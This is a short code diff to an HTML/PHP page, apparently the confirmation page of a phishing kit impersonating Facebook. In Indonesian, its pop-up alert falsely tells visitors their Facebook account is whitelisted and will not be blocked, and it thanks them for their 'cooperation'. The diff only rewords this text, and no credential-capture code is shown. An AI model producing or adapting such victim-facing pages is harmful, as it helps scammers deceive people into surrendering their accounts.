@@ -4,9 +4,10 @@
 	<title>Facebook ANDA telah aman</title>
 </head>
 <body>
-<script>alert('Facebook ANDA terdaftar AKTIF dan masuk kedalam WhiteList, Terima kasih telah memberitahu kami, Sekarang Facebook Kamu Tidak Akan Kami Blokir');</script>
+<script>alert('Facebook ANDA terdaftar AKTIF dan masuk kedalam WhiteList, Terima kasih telah memberitahu kami, Sekarang Facebook ANDA tidak akan Terblokir');</script>
 <?php
 ?>
-Thank You
+TERIMA KASIH
+ATAS KERJA SAMANYA
 </body>
 </html>	
